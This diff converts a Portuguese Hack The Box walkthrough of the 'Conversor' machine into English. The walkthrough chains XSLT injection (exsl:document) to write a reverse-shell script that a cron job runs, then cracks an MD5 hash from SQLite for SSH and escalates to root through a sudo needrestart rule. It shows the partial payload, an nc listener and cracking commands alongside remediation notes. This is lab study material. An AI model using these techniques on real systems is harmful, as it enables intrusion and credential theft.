@@ -1,109 +1,83 @@
-# Hack The Box — Conversor
+## Summary
 
-![HTB](https://img.shields.io/badge/Platform-Hack%20The%20Box-green)
-![Difficulty](https://img.shields.io/badge/Difficulty-Easy-blue)
-![OS](https://img.shields.io/badge/OS-Linux-orange)
-![Category](https://img.shields.io/badge/Category-Web%20%2B%20Privesc-red)
+Conversor is an Easy Linux machine hosting a web app that converts Nmap scans
+using XML/XSLT. The `/about` endpoint leaks the source code, revealing an XSLT
+processor and a cron job that runs any `.py` file in a scripts directory. An
+**XSLT injection** with `exsl:document` writes a malicious script that the cron
+job executes, granting a shell as `www-data`. A local SQLite database yields a
+crackable MD5 hash for SSH access, and a sudo rule on **needrestart** is abused
+to escalate to **root**.
 
----
+## Machine Information
 
-# Informações da Máquina
+| Name | Difficulty | OS | Platform |
+| --- | --- | --- | --- |
+| Conversor | Easy | Linux | Hack The Box |
 
-| Nome       | Dificuldade | Plataforma    | OS    |
-| ---------- | ---------- | ------------ | ----- |
-| Conversor  | Easy       | Hack The Box | Linux |
+## Attack Path
 
----
+1. Service enumeration reveals HTTP and SSH.
+2. Web enumeration discovers the `/about` endpoint.
+3. The application source code is downloaded and analyzed.
+4. An XSLT injection (`exsl:document`) writes a file to the server.
+5. A cron job executes the written script.
+6. A reverse shell is received as `www-data`.
+7. Credentials are extracted from a SQLite database (MD5).
+8. SSH access is obtained as the user.
+9. A sudo rule on `needrestart` is abused to escalate to root.
 
-# Superfície de ataque
+## Reconnaissance
 
-```
-1. Enumeração de serviços (HTTP + SSH)
-2. Descoberta de endpoints web (/about)
-3. Análise do código fonte
-4. Exploração de XSLT → escrita de arquivo (exsl:document)
-5. Execução via cron job
-6. Acesso como www-data
-7. Extração de credenciais (SQLite + MD5)
-8. SSH como usuário
-9. Escalação via sudo (needrestart)
-```
+Initial enumeration was performed with **Nmap**.
 
----
-
-# Reconhecimento
-
-A enumeração inicial foi realizada com Nmap.
-
-```
+```bash
 nmap -sC -sV -A -T4 10.129.22.117
 ```
 
-![Nmap Scan](screenshots/nmap.png)
+| Port | Service | Notes |
+| --- | --- | --- |
+| 22 | SSH | OpenSSH 8.9p1 |
+| 80 | HTTP | Conversor web application |
 
-### Descobertas
+## Web Enumeration
 
-| Porta | Serviço | Observações |
-|------|--------|-------------|
-| 22   | SSH    | OpenSSH 8.9p1 |
-| 80   | HTTP   | Aplicação web Conversor |
+The web application accepts XML and XSLT uploads to convert Nmap scans. Content
+discovery was run with Gobuster:
 
----
-
-# Enumeração Web
-
-A aplicação web permite upload de arquivos XML e XSLT para conversão de scans do Nmap.
-
-![Web Page](screenshots/conversor.png)
-
-Para descobrir endpoints adicionais, foi utilizado Gobuster:
-
-```
+```bash
 gobuster dir -u http://conversor.htb/ -w /usr/share/wordlists/dirb/common.txt
 ```
 
-![Gobuster](screenshots/gobuster.png)
+Key findings:
 
-### Descobertas importantes:
+- `/about` — page with a source code download option
+- `/login`, `/register` — authentication system
 
-- `/about` → página com opção de download do código fonte
-- `/login`, `/register` → sistema de autenticação
+The `/about` endpoint was essential, as it provided the application's source
+code.
 
-O endpoint `/about` foi essencial, pois forneceu acesso ao código fonte da aplicação.
+## Source Code Review
 
----
+The source code revealed:
 
-# Análise do Código Fonte
+- `lxml` is used for XML/XSLT processing.
+- File uploads are user-controlled.
+- A scripts directory exists at `/var/www/conversor.htb/scripts/`.
 
-Após extrair o código, foi identificado o seguinte:
-
-- Uso de `lxml` para processamento de XML/XSLT
-- Upload de arquivos controlado pelo usuário
-- Existência de diretório:
-
-```
-/var/www/conversor.htb/scripts/
-```
-
-No arquivo `install.md`, foi encontrado:
+`install.md` contained a cron job:
 
 ```
 * * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
 ```
 
-Ou seja:
+In other words, any `.py` file placed in that directory is executed
+automatically.
 
-Qualquer script `.py` nesse diretório é executado automaticamente.
+## Exploitation — XSLT Injection (exsl:document)
 
----
-
-# Exploração
-
-A exploração foi baseada em **XSLT Injection com exsl:document**.
-
-Essa funcionalidade permite escrever arquivos no servidor durante a transformação.
-
-Payload utilizado:
+XSLT with the EXSLT `exsl:document` element can write files to disk during the
+transformation. This was used to drop a reverse shell into the scripts
+directory.
 
 ```xml
 <xsl:stylesheet version="1.0"
@@ -126,130 +100,72 @@ subprocess.call(["/bin/sh","-i"])
 </xsl:stylesheet>
 ```
 
----
+## Initial Access (User)
 
-# Acesso Inicial
+After uploading the payload, the file was written to `/scripts`, the cron job
+executed it, and a reverse shell was received as `www-data`.
 
-Após o upload do payload:
-
-1. O arquivo foi escrito em `/scripts`
-2. O cron job executou automaticamente
-3. Reverse shell foi recebida
-
-```
+```bash
 nc -lvnp 1234
 ```
 
-![Shell](screenshots/shell.png)
+A SQLite database was found containing user credentials:
 
----
-
-# Flag de Usuário
-
-Foi identificado um banco SQLite:
-
-```
-/var/www/conversor.htb/instance/users.db
-```
-
-Consulta realizada:
-
-```
-sqlite3 users.db
+```bash
+sqlite3 /var/www/conversor.htb/instance/users.db
 SELECT * FROM users;
 ```
 
-![DB Hash](screenshots/db_hash.png)
+The MD5 hash was cracked and reused for SSH:
 
-O hash MD5 foi quebrado utilizando:
-
-```
+```bash
 john --format=raw-md5 hash --wordlist=/usr/share/wordlists/rockyou.txt
-```
-
-Senha recuperada → acesso via SSH:
-
-```
 ssh fismathack@10.129.22.117
 ```
 
-![User Flag](screenshots/user_flag.png)
+The user flag lives at `/home/fismathack/user.txt`.
 
-```
-00f53b.....................
-```
+## Privilege Escalation
 
----
+### Enumeration
 
-# Escalação de Privilégio
-
-Enumeração com:
-
-```
+```bash
 sudo -l
 ```
-
-![Enumeration](screenshots/privilege_escalation.png)
-
-Resultado:
 
 ```
 (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
 ```
 
----
+### Abusing needrestart
 
-# Explorando a Escalação de Privilégio
+The `needrestart` binary can be abused to execute code as root, which produced a
+root shell. The root flag lives at `/root/root.txt`.
 
-O binário `needrestart` pode ser abusado para execução como root.
+## Vulnerability Analysis
 
-Após exploração, foi possível obter shell como root.
+**XSLT injection → arbitrary file write → RCE** — insecure XSLT processing with
+EXSLT support (`exsl:document`) allowed writing arbitrary files, which combined
+with the writable-directory cron job produced automatic code execution as
+`www-data`. Fix: disable EXSLT extensions, sandbox the XSLT processor, and never
+execute files from attacker-writable directories.
 
-![Root Shell](screenshots/root_shell.png)
+**Misconfigured sudo (`needrestart`)** — the user could run `needrestart` as root
+without a password, and the binary can be coerced into executing arbitrary code.
+Fix: remove the NOPASSWD rule and avoid granting sudo on binaries that load
+external code.
 
----
+## Tools Used
 
-# Flag Root
+- Nmap
+- Gobuster
+- John the Ripper
+- Netcat
+- SSH
 
-![Root Flag](screenshots/root_flag.png)
+## Key Takeaways
 
-```
-360031.....................
-```
-
----
-
-# Vulnerabilidades Identificadas
-
-### XSLT Injection → Arbitrary File Write → RCE
-
-Descrição:
-* Uso inseguro de XSLT com suporte a EXSLT
-* Permite escrita de arquivos arbitrários
-* Combinado com cron job → execução automática
-* Resultado: Remote Code Execution
-
----
-
-# Ferramentas Utilizadas
-
-* Nmap
-* Gobuster
-* John
-* Netcat
-* SSH
-
----
-
-# Principais Aprendizados
-
-* XSLT pode ser extremamente perigoso
-* EXSLT (`exsl:document`) pode levar a RCE
-* Cron jobs são vetores críticos
-* Revisão de código fonte é essencial em CTFs
-
----
-
-# Autor
-
-https://github.com/ninjaa-exe
+- XSLT processing can be extremely dangerous; EXSLT (`exsl:document`) enables file writes and RCE.
+- Cron jobs that execute files from writable directories are a critical vector.
+- Source code review is invaluable for finding the intended path.
+- Interpreted binaries allowed via sudo make for trivial escalation.
